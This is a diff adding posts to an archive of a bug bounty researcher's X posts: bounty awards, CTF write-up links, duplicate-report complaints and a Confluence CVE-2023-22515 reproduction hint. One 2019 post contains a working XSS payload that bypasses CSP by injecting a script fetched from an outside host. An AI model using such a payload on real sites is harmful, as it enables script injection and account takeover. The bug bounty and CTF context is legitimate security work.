@@ -2,9 +2,9 @@
 
 _Generated 2026-11-11 from the X API (full-archive search + timeline). Every post below is copied word-for-word; t.co links are expanded; quoted posts are inlined in full; media are listed with alt text when the author provided it. Posts are grouped by conversation (a thread = the author's root post followed by their own replies, oldest first). Groups are newest first. An agent without X access can rely on this file._
 
-- Posts in this file: 338
-- Conversations/threads: 310
-- Oldest post captured: 2020-05-27
+- Posts in this file: 370
+- Conversations/threads: 342
+- Oldest post captured: 2019-06-03
 - Newest post captured: 2026-11-09
 
 
@@ -7998,6 +7998,62 @@ Tags (automatic): XSS, RCE
 
 ---
 
+## 2023-10-10 · Post · Here is the blog post for 
+
+
+### Post — @S1r1u5_ — 2023-10-10 15:21 UTC (2023-10-10 16:21 WAT)
+
+- URL: https://x.com/S1r1u5_/status/1711763963313271037
+- Metrics (at fetch): not returned
+
+> Here is the blog post for 
+>
+> CVE-2023-22515: Broken Access Control Vulnerability in Confluence Data Center and Server
+>
+> I've left two challenges in it, try to solve them. If you solve second one, that would be a 0-day 😅
+>
+> https://blog.s1r1us.ninja/research/brokenconflu
+
+**Links in post:** https://blog.s1r1us.ninja/research/brokenconflu
+
+
+---
+
+## 2023-10-09 · Post · Finally managed to reproduce CVE-2023-22515! 🐞
+
+
+### Post — @S1r1u5_ — 2023-10-09 12:12 UTC (2023-10-09 13:12 WAT)
+
+- URL: https://x.com/S1r1u5_/status/1711353822260707694
+- Metrics (at fetch): not returned
+
+> Finally managed to reproduce CVE-2023-22515! 🐞
+>
+> It took me an entire weekend of reverse engineering in Java, but @TheGrandPew cracked it in just a few hours 😅. It is a good learning experience tho.
+>
+> gotta get back to work, my eyes are bleeding after hours of staring at the code https://twitter.com/TheGrandPew/status/1709923149473812799
+
+**Links in post:** https://twitter.com/TheGrandPew/status/1709923149473812799
+
+**Quoted post (full text):**
+
+    #### Quoted post — @1103256108225900547 — 2023-10-05 13:27 UTC (2023-10-05 14:27 WAT)
+    
+    - URL: https://x.com/1103256108225900547/status/1709923149473812799
+    - Metrics (at fetch): not returned
+    
+    > Reproduced the Confluence "auth bypass" CVE-2023-22515 this afternoon
+    >
+    > It is Pre Auth and it can lead to RCE... without hitting setupadministrator.action so just log /setup/**! !
+    >
+    > really stupid root cause, I believe it could lead to other auth byapss's and RCES.
+    >
+    > #CVE-2023-22515
+    
+
+
+---
+
 ## 2020-12-31 · Post · Late-night Reflecting on 2020, I would say 2020 was one hell of a year for me. The best thing is I w
 
 
@@ -8358,3 +8414,534 @@ Tags (automatic): XSS
 - photo: https://pbs.twimg.com/media/EZC5me3U4AADOXd.png — no alt text provided by author
 
 **Links in post:** https://blog.s1r1us.ninja/CTF/tangled_browsers
+
+
+---
+
+## 2020-04-16 · Post · It feels so good to exploit a critical bug on bug hunting target which is like a CTF challenge. I wa
+
+
+### Post — @S1r1u5_ — 2020-04-16 05:57 UTC (2020-04-16 06:57 WAT)
+
+- URL: https://x.com/S1r1u5_/status/1250664706777337856
+- Metrics (at fetch): bookmark 10, impression 0, like 20, quote 0, reply 1, retweet 1
+
+> It feels so good to exploit a critical bug on bug hunting target which is like a CTF challenge. I was able to takeover an account, which is somewhat similar to below #ctf challenge.
+> #bugbountytips 
+>
+> https://t.co/KEftnHKxNo
+
+
+---
+
+## 2020-04-12 · Post · Writeup for @BanditsByte CTF https://t.co/KEftnHKxNo. You can find a cool xss web challenge.
+
+
+Tags (automatic): XSS
+
+
+### Post — @S1r1u5_ — 2020-04-12 17:43 UTC (2020-04-12 18:43 WAT)
+
+- URL: https://x.com/S1r1u5_/status/1249392726086266880
+- Metrics (at fetch): bookmark 3, impression 0, like 16, quote 0, reply 0, retweet 1
+
+> Writeup for @BanditsByte CTF https://t.co/KEftnHKxNo. You can find a cool #xss web challenge.
+
+
+---
+
+## 2020-04-09 · Post · Writeup coming soon 😇 https://t.co/wcCGG7nRJk
+
+
+### Post — @S1r1u5_ — 2020-04-09 14:25 UTC (2020-04-09 15:25 WAT)
+
+- URL: https://x.com/S1r1u5_/status/1248255836956160001
+- Metrics (at fetch): bookmark 1, impression 0, like 47, quote 0, reply 1, retweet 0
+
+> Writeup coming soon 😇 https://t.co/wcCGG7nRJk
+
+**Media:**
+- photo: https://pbs.twimg.com/media/EVKyEMbUYAEokGl.jpg — no alt text provided by author
+
+
+---
+
+## 2020-04-07 · Post · Check this cool xss challenge! https://t.co/T6pZ0IwpVy
+
+
+Tags (automatic): XSS
+
+
+### Post — @S1r1u5_ — 2020-04-07 13:41 UTC (2020-04-07 14:41 WAT)
+
+- URL: https://x.com/S1r1u5_/status/1247519866870886404
+- Metrics (at fetch): bookmark 2, impression 0, like 6, quote 0, reply 0, retweet 0
+
+> Check this cool xss challenge! https://t.co/T6pZ0IwpVy
+
+**Quoted post (full text):**
+
+    #### Quoted post — @554316280 — 2020-04-04 20:05 UTC (2020-04-04 21:05 WAT)
+    
+    - URL: https://x.com/554316280/status/1246529233419153410
+    - Metrics (at fetch): bookmark 0, impression 0, like 10, quote 2, reply 2, retweet 3
+    
+    > I created Level 2 on https://t.co/nKPC3FObPv. Give it try! Send me DM with a solution to be added to the "HALL OF FAME". Should be fun!! Check this thread for later hint drops if needed. 😜👍
+    
+
+
+---
+
+## 2020-04-06 · Post · I am hesitant to submit bug because it will be closed as duplicate of @securinti 's report which he 
+
+
+### Post — @S1r1u5_ — 2020-04-06 16:14 UTC (2020-04-06 17:14 WAT)
+
+- URL: https://x.com/S1r1u5_/status/1247195927573483520
+- Metrics (at fetch): bookmark 0, impression 0, like 12, quote 0, reply 3, retweet 0
+
+> I am hesitant to submit bug because it will be closed as duplicate of @securinti 's report which he recently reported.
+
+
+---
+
+## 2020-03-31 · Post · Just one cool bug a month.😋🤑
+
+
+### Post — @S1r1u5_ — 2020-03-31 10:11 UTC (2020-03-31 11:11 WAT)
+
+- URL: https://x.com/S1r1u5_/status/1244930240041725952
+- Metrics (at fetch): bookmark 0, impression 0, like 11, quote 0, reply 2, retweet 0
+
+> Just one cool bug a month.😋🤑
+
+
+---
+
+## 2020-03-04 · Post · How to get a private invite on @Bugcrowd. tbh, I tried some public, but I failed. Any suggestions.
+
+
+Tags (automatic): Platform: Bugcrowd
+
+
+### Post — @S1r1u5_ — 2020-03-04 06:56 UTC (2020-03-04 07:56 WAT)
+
+- URL: https://x.com/S1r1u5_/status/1235096708196925440
+- Metrics (at fetch): bookmark 0, impression 0, like 4, quote 0, reply 1, retweet 0
+
+> How to get a private invite on @Bugcrowd. tbh, I tried some public, but I failed. Any suggestions.
+
+
+---
+
+## 2020-03-01 · Post · Neat! Thanks for the awesome writeup. https://t.co/p76QqwPpX4
+
+
+### Post — @S1r1u5_ — 2020-03-01 04:04 UTC (2020-03-01 05:04 WAT)
+
+- URL: https://x.com/S1r1u5_/status/1233966311987793920
+- Metrics (at fetch): bookmark 0, impression 0, like 11, quote 0, reply 0, retweet 0
+
+> Neat! Thanks for the awesome writeup. https://t.co/p76QqwPpX4
+
+**Quoted post (full text):**
+
+    #### Quoted post — @74407752 — 2020-03-01 02:32 UTC (2020-03-01 03:32 WAT)
+    
+    - URL: https://x.com/74407752/status/1233943254111903744
+    - Metrics (at fetch): bookmark 249, impression 0, like 1779, quote 27, reply 57, retweet 613
+    
+    > Facebook OAuth Vulnerability.
+    > $55,000 Bounty Awarded by Facebook.
+    >
+    > Writeup:
+    > https://t.co/MpVgyUSQqQ
+    >
+    > #Facebook #Security #BugBounty
+    
+
+
+---
+
+## 2020-02-29 · Post · Yay, I was awarded a $2,500 bounty on @Hacker0x01! https://hackerone.com/s1r1u5 TogetherWeHitHarder
+
+
+Tags (automatic): Platform: HackerOne
+
+
+### Post — @S1r1u5_ — 2020-02-29 01:13 UTC (2020-02-29 02:13 WAT)
+
+- URL: https://x.com/S1r1u5_/status/1233560878701780992
+- Metrics (at fetch): not returned
+
+> Yay, I was awarded a $2,500 bounty on @Hacker0x01! https://hackerone.com/s1r1u5 #TogetherWeHitHarder
+
+**Links in post:** https://hackerone.com/s1r1u5
+
+
+---
+
+## 2020-02-29 · Post · Yay, I was awarded a $6,050 bounty on @Hacker0x01! https://hackerone.com/s1r1u5 TogetherWeHitHarder
+
+
+Tags (automatic): Platform: HackerOne
+
+
+### Post — @S1r1u5_ — 2020-02-29 01:13 UTC (2020-02-29 02:13 WAT)
+
+- URL: https://x.com/S1r1u5_/status/1233560805918093313
+- Metrics (at fetch): not returned
+
+> Yay, I was awarded a $6,050 bounty on @Hacker0x01! https://hackerone.com/s1r1u5 #TogetherWeHitHarder
+
+**Links in post:** https://hackerone.com/s1r1u5
+
+
+---
+
+## 2020-02-09 · Post · @nullcon  HackIM Split Challenge is so good, I used  Non-alpha numeric JS and double encoding to by
+
+
+### Post — @S1r1u5_ — 2020-02-09 05:13 UTC (2020-02-09 06:13 WAT)
+
+- URL: https://x.com/S1r1u5_/status/1226373419383439360
+- Metrics (at fetch): not returned
+
+> @nullcon  #HackIM Split Challenge is so good, I used  Non-alpha numeric JS and double encoding to bypass regex and whitelist, funnly my payload length is 1852.
+
+
+---
+
+## 2020-01-11 · Post · Hey bugbounty peeps, I found an access control bypass in an application, this bypass can be applied
+
+
+### Post — @S1r1u5_ — 2020-01-11 17:21 UTC (2020-01-11 18:21 WAT)
+
+- URL: https://x.com/S1r1u5_/status/1216047524911276032
+- Metrics (at fetch): not returned
+
+> Hey #bugbounty peeps, I found an access control bypass in an application, this bypass can be applied to many of the endpoints. Do I need to submit separate reports for different endpoints 🤔.
+
+
+---
+
+## 2020-01-08 · Post · Yay, I was awarded a $750 bounty on @Hacker0x01! https://hackerone.com/s1r1u5 TogetherWeHitHarder
+
+
+Tags (automatic): Platform: HackerOne
+
+
+### Post — @S1r1u5_ — 2020-01-08 15:47 UTC (2020-01-08 16:47 WAT)
+
+- URL: https://x.com/S1r1u5_/status/1214936744686080001
+- Metrics (at fetch): not returned
+
+> Yay, I was awarded a $750 bounty on @Hacker0x01! https://hackerone.com/s1r1u5 #TogetherWeHitHarder
+
+**Links in post:** https://hackerone.com/s1r1u5
+
+
+---
+
+## 2020-01-03 · Post · Yay, I was awarded a $1,250 bounty on @Hacker0x01! https://hackerone.com/s1r1u5 TogetherWeHitHarder
+
+
+Tags (automatic): Platform: HackerOne
+
+
+### Post — @S1r1u5_ — 2020-01-03 22:12 UTC (2020-01-03 23:12 WAT)
+
+- URL: https://x.com/S1r1u5_/status/1213221595272998912
+- Metrics (at fetch): not returned
+
+> Yay, I was awarded a $1,250 bounty on @Hacker0x01! https://hackerone.com/s1r1u5 #TogetherWeHitHarder. First bounty of 2020😀
+
+**Links in post:** https://hackerone.com/s1r1u5
+
+
+---
+
+## 2019-12-20 · Post · Yay, I was awarded a $2000 bounty on @Hacker0x01! https://hackerone.com/s1r1u5 TogetherWeHitHarder 
+
+
+Tags (automatic): IDOR / BOLA, Platform: HackerOne
+
+
+### Post — @S1r1u5_ — 2019-12-20 02:09 UTC (2019-12-20 03:09 WAT)
+
+- URL: https://x.com/S1r1u5_/status/1207845433432653824
+- Metrics (at fetch): not returned
+
+> Yay, I was awarded a $2000 bounty on @Hacker0x01! https://hackerone.com/s1r1u5 #TogetherWeHitHarder for multiple issues IDOR, VE, CSRF...
+
+**Links in post:** https://hackerone.com/s1r1u5
+
+
+---
+
+## 2019-12-19 · Post · Yay, I was awarded a $300 bounty on @Hacker0x01! https://hackerone.com/s1r1u5 TogetherWeHitHarder
+
+
+Tags (automatic): Platform: HackerOne
+
+
+### Post — @S1r1u5_ — 2019-12-19 16:31 UTC (2019-12-19 17:31 WAT)
+
+- URL: https://x.com/S1r1u5_/status/1207699995547226112
+- Metrics (at fetch): not returned
+
+> Yay, I was awarded a $300 bounty on @Hacker0x01! https://hackerone.com/s1r1u5 #TogetherWeHitHarder
+
+**Links in post:** https://hackerone.com/s1r1u5
+
+
+---
+
+## 2019-10-26 · Post · My writeup for @hack_lu CTF, it was a fun CTF learned a lot about kernel exploitation and heap.
+
+
+Tags (automatic): Memory corruption / native
+
+
+### Post — @S1r1u5_ — 2019-10-26 10:44 UTC (2019-10-26 11:44 WAT)
+
+- URL: https://x.com/S1r1u5_/status/1188043607518769153
+- Metrics (at fetch): not returned
+
+> My writeup for @hack_lu CTF, it was a fun CTF learned a lot about kernel exploitation and heap.
+> https://www.s1r1us.ninja/2019/10/hacklu-ctf-2019-writeups.html
+
+**Links in post:** https://www.s1r1us.ninja/2019/10/hacklu-ctf-2019-writeups.html
+
+
+---
+
+## 2019-09-16 · Post · My writeup for CSAW'19 Quals CTF. https://s1r1uss.blogspot.com/2019/09/csaw-ctf19-quals-writeup.html
+
+
+### Post — @S1r1u5_ — 2019-09-16 21:38 UTC (2019-09-16 22:38 WAT)
+
+- URL: https://x.com/S1r1u5_/status/1173712891205210112
+- Metrics (at fetch): not returned
+
+> My writeup for CSAW'19 Quals CTF. https://s1r1uss.blogspot.com/2019/09/csaw-ctf19-quals-writeup.html #CTF
+
+**Links in post:** https://s1r1uss.blogspot.com/2019/09/csaw-ctf19-quals-writeup.html
+
+
+---
+
+## 2019-09-13 · Post · Yay, I was awarded a $500 bounty on @Hacker0x01! https://hackerone.com/s1r1u5 TogetherWeHitHarder. 
+
+
+Tags (automatic): XSS, Platform: HackerOne
+
+
+### Post — @S1r1u5_ — 2019-09-13 14:10 UTC (2019-09-13 15:10 WAT)
+
+- URL: https://x.com/S1r1u5_/status/1172512984184193024
+- Metrics (at fetch): not returned
+
+> Yay, I was awarded a $500 bounty on @Hacker0x01! https://hackerone.com/s1r1u5 #TogetherWeHitHarder. #bugbountytip Actually, I am afraid to test the program cuz I saw some good hackers in the thanks page, But I started and I found a reflected XSS on the main page itself.😇
+
+**Links in post:** https://hackerone.com/s1r1u5
+
+
+---
+
+## 2019-09-11 · Post · Can anyone minimize this script as much as possible to bypass CSP.
+
+
+Tags (automatic): XSS, CSP / CSPT
+
+
+### Post — @S1r1u5_ — 2019-09-11 06:00 UTC (2019-09-11 07:00 WAT)
+
+- URL: https://x.com/S1r1u5_/status/1171664855625011200
+- Metrics (at fetch): not returned
+
+> Can anyone minimize this script as much as possible to bypass CSP.
+> d=document,c="createElement",a="appendChild",i=d[c]("iframe"),i.src="/f",d.body[a](i),s=d[c]("script"),s.src="//14.rs/",window.frames[0].document.head[a](s); @brutelogic @filedescriptor #XSS
+
+
+---
+
+## 2019-09-03 · Post · Don't expect more when you hack on AT&amp;T, most of the time it's duplicate bugbounty @hackerone. 
+
+
+Tags (automatic): Platform: HackerOne
+
+
+### Post — @S1r1u5_ — 2019-09-03 11:10 UTC (2019-09-03 12:10 WAT)
+
+- URL: https://x.com/S1r1u5_/status/1168843695401005056
+- Metrics (at fetch): not returned
+
+> Don't expect more when you hack on AT&amp;T, most of the time it's duplicate #bugbounty @hackerone. @D1r3_Wolf_
+
+
+---
+
+## 2019-08-30 · Post · Yay, I was awarded a $750 bounty on @Hacker0x01! https://hackerone.com/s1r1u5 TogetherWeHitHarder 
+
+
+Tags (automatic): Platform: HackerOne
+
+
+### Post — @S1r1u5_ — 2019-08-30 02:32 UTC (2019-08-30 03:32 WAT)
+
+- URL: https://x.com/S1r1u5_/status/1167263865958096896
+- Metrics (at fetch): not returned
+
+> Yay, I was awarded a $750 bounty on @Hacker0x01! https://hackerone.com/s1r1u5 #TogetherWeHitHarder 
+> Thank you @NahamSec and #AlekRelyea for solving the issue with low signal. It's all because of @NahamSec 🙏
+
+**Links in post:** https://hackerone.com/s1r1u5
+
+
+---
+
+## 2019-08-29 · Post · Fingers crossed, me and @D1r3_Wolf_ successful created a Video POC for account takeover. @Hacker0x01
+
+
+Tags (automatic): Account takeover, Platform: HackerOne
+
+
+### Post — @S1r1u5_ — 2019-08-29 04:13 UTC (2019-08-29 05:13 WAT)
+
+- URL: https://x.com/S1r1u5_/status/1166926849378643968
+- Metrics (at fetch): not returned
+
+> Fingers crossed, me and @D1r3_Wolf_ successful created a Video POC for account takeover. @Hacker0x01
+
+
+---
+
+## 2019-08-23 · Post · I got some invites now, and I found those bugs on public program. Through ASN recon 😊 https://twitte
+
+
+### Post — @S1r1u5_ — 2019-08-23 08:16 UTC (2019-08-23 09:16 WAT)
+
+- URL: https://x.com/S1r1u5_/status/1164813713859174402
+- Metrics (at fetch): not returned
+
+> I got some invites now, and I found those bugs on public program. Through ASN recon 😊 https://twitter.com/gwendallecoguic/status/1164803831680475141
+
+**Links in post:** https://twitter.com/gwendallecoguic/status/1164803831680475141
+
+**Quoted post (full text):**
+
+    #### Quoted post — @83622966 — 2019-08-23 07:37 UTC (2019-08-23 08:37 WAT)
+    
+    - URL: https://x.com/83622966/status/1164803831680475141
+    - Metrics (at fetch): not returned
+    
+    > @S1r1u5_ If you're able to find ssrf, xxe and rce on  that private program, you could easily find smaller bugs in public programs. Or you can work on the Hackerone CTF to get more invites, it works very well and it's not so hard :)
+    
+
+
+---
+
+## 2019-08-22 · Post · I can't switch because, after a hell of recon I found this and I don't have other private program op
+
+
+### Post — @S1r1u5_ — 2019-08-22 08:28 UTC (2019-08-22 09:28 WAT)
+
+- URL: https://x.com/S1r1u5_/status/1164454384509452288
+- Metrics (at fetch): not returned
+
+> I can't switch because, after a hell of recon I found this and I don't have other private program option's. https://t.co/H7HTWCGcmu
+
+**Quoted post (full text):**
+
+    #### Quoted post — @83622966 — 2019-08-22 08:19 UTC (2019-08-22 09:19 WAT)
+    
+    - URL: https://x.com/83622966/status/1164452018636959744
+    - Metrics (at fetch): not returned
+    
+    > @S1r1u5_ @Hacker0x01 RCE dup would immediately trigger my program switcher. As Mark said, it means alot!
+    
+
+
+---
+
+## 2019-08-21 · Post · This is ridiculous, my third bug on 
+
+
+Tags (automatic): RCE, Platform: HackerOne
+
+
+### Post — @S1r1u5_ — 2019-08-21 14:06 UTC (2019-08-21 15:06 WAT)
+
+- URL: https://x.com/S1r1u5_/status/1164176894381527040
+- Metrics (at fetch): not returned
+
+> This is ridiculous, my third bug on 
+> @Hacker0x01
+>  which is RCE is also a duplicate. I am declaring my self as #DUPEHUNTER😟 #bugbounty
+
+
+---
+
+## 2019-08-21 · Post · Damn, my first two reports(SSRF, XXE) on @Hacker0x01 are duplicates.😰 hackerone
+
+
+Tags (automatic): SSRF, Platform: HackerOne
+
+
+### Post — @S1r1u5_ — 2019-08-21 09:09 UTC (2019-08-21 10:09 WAT)
+
+- URL: https://x.com/S1r1u5_/status/1164102179088556032
+- Metrics (at fetch): not returned
+
+> Damn, my first two reports(SSRF, XXE) on @Hacker0x01 are duplicates.😰 #hackerone
+
+
+---
+
+## 2019-08-04 · Post · Here is my writeup for @hackthebox_eu vulnerable VM FORTUNE. It's very interesting VM.
+
+
+### Post — @S1r1u5_ — 2019-08-04 19:17 UTC (2019-08-04 20:17 WAT)
+
+- URL: https://x.com/S1r1u5_/status/1158094724672004096
+- Metrics (at fetch): not returned
+
+> Here is my writeup for @hackthebox_eu vulnerable VM FORTUNE. It's very interesting VM.
+> https://s1r1uss.blogspot.com/2019/08/fortune-hackthebox-walkthrough.html
+
+**Links in post:** https://s1r1uss.blogspot.com/2019/08/fortune-hackthebox-walkthrough.html
+
+
+---
+
+## 2019-08-01 · Post · Open redirection to account takeover. Got the first bounty of $300. Thank you @hackrew_  for the liv
+
+
+Tags (automatic): Account takeover
+
+
+### Post — @S1r1u5_ — 2019-08-01 13:42 UTC (2019-08-01 14:42 WAT)
+
+- URL: https://x.com/S1r1u5_/status/1156923221125419010
+- Metrics (at fetch): not returned
+
+> Open redirection to account takeover. Got the first bounty of $300. Thank you @hackrew_  for the live hacking event. #BugBounty  @teaminvaders0 @Sud0_u53r @D1r3_Wolf_
+
+
+---
+
+## 2019-06-03 · Post · My writeup for Facebook CTF - 2019
+
+
+### Post — @S1r1u5_ — 2019-06-03 09:09 UTC (2019-06-03 10:09 WAT)
+
+- URL: https://x.com/S1r1u5_/status/1135473542215098368
+- Metrics (at fetch): not returned
+
+> My writeup for Facebook CTF - 2019
+> https://s1r1uss.blogspot.com/2019/06/facebook-ctf-2019-writeup_2.html
+> secret note keeper is an awesome challenge which is about Cross Site Leaks(XSLeaks)/Search.
+> Thanks for the great challenges #fbctf #fbctf_2019
+
+**Links in post:** https://s1r1uss.blogspot.com/2019/06/facebook-ctf-2019-writeup_2.html
